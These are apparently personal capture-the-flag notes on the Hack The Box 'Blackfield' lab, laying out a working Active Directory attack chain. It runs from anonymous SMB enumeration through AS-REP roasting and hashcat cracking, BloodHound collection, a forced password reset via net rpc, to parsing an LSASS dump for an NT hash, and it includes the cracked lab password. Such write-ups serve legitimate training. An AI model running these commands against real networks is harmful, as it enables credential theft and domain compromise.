# SMB
---
- `smbclient -L \\\\10.10.10.192\\ -U anonymous`
	- ![[Pasted image 20250425160049.png]]
- **profiles$**
---
	- Looks like names:
		- ![[Pasted image 20250425160240.png]]
		- `cat user_gar.txt | awk '{print $1}' > users.txt`
**-  Forensic**
---
- Not accessible
	- ![[Pasted image 20250425161104.png]]


# ASREP-roasting
---
- We try `asrep-roasting`the list of found users:
	- `impacket-GetNPUsers BLACKFIELD.local/ -usersfile users.txt -dc-ip 10.10.10.192 -no-pass -format john`
	- ![[Pasted image 20250425161211.png]]
- Crack the hash:
	- `hashcat support_hash.txt /usr/share/wordlists/rockyou.txt`
	- ![[Pasted image 20250425161401.png]]
	- `support`: `#00^BlackKnight`

# Bloodhound Enumeration
---
- Apparently, **we can use bloodhound even if only smb login works (didn't knew that)**
- Start `neo4j`and `bloodhound`as sudo
- Dump using:
	- `sudo bloodhound-python -d BLACKFIELD.LOCAL -u support -p '#00^BlackKnight' -ns 10.10.10.192 -c all`
- And load in bloodhound
- **Mark `support`user as `Owned`**
- Double click `support`user for more information:
	- ![[Pasted image 20250426022106.png]]
	- ![[Pasted image 20250426022125.png]]
- **==Support user can ForceChangePassword of Audi2020==**
	- ![[Pasted image 20250426022218.png]]
	- `net rpc password "audit2020" "Password1" -U "BLACKFIELD.LOCAL"/"support"%"#00^BlackKnight" -S "10.10.10.192"`
	- `audit2020`: `Password1`
# SMB Shares with `audit2020` user
----
- Now that we changed `audi2020`' password, we can explore **`forensic`share**
	- `smbclient  \\\\10.10.10.192\\forensic -U audit2020 --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 1000`
	- ![[Pasted image 20250426022408.png]]
	- ![[Pasted image 20250426024339.png]]
	- ![[Pasted image 20250426024412.png]]

# Analyzing Lsass Dump (using `pypykatz)
---
- `pypykatz lsa minidump lsass.DMP`:
	- We find NT hash of `svc_backup`:
		- ![[Pasted image 20250426045303.png]]
